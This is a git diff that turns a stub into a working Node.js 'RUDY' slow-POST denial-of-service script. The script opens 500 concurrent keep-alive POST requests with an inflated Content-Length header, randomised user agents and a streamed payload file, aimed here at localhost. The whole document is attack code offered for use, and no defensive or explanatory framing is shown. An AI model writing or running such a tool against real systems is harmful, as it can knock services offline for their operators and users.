@@ -1,26 +1,36 @@
-const readline = require('readline-promise').default
+const request = require('request')
+const useragent = require('random-useragent')
+const rp = require('request-promise')
+const fs = require('fs')
 
-const rlp = readline.createInterface({
-  input: process.stdin,
-  output: process.stdout,
-  terminal: true
-})
+let stream = fs.createReadStream('payload.txt')
 
-const config = {
+const host = 'http://localhost:3000/'
+const connections = 500
 
+const options = {
+  method: 'POST',
+  uri: host,
+  headers: {
+    'Connection': 'keep-alive',
+    'Content-Length': '1048576',
+    'User-Agent': useragent.getRandom()
+  },
+  formData: {
+    file: stream
+  }
 }
 
 rudyAttack()
 
 function rudyAttack() {
-  for(let i = 0; i < connections, i++) {
+  for(let i = 0; i < connections; i++) {
     attack()
   }
 }
 
 function attack() {
-  const stream =  createStream()
-  request(stream, config)
+  rp(options)
   .then(() => {
     console.log('Successful attack')
     closeStream()
@@ -31,23 +41,7 @@ function attack() {
   })
 }
 
-function request(stream) {
-  return new Promise((resolve, reject) => {
-    request({ config })
-    .then(() => {
-      resolve()
-    })
-    .catch( err => {
-      reject(err)
-    })
-  })
-}
-
-function createStream() {
-
-}
-
 function closeStream() {
-
+  stream.close()
 }
 
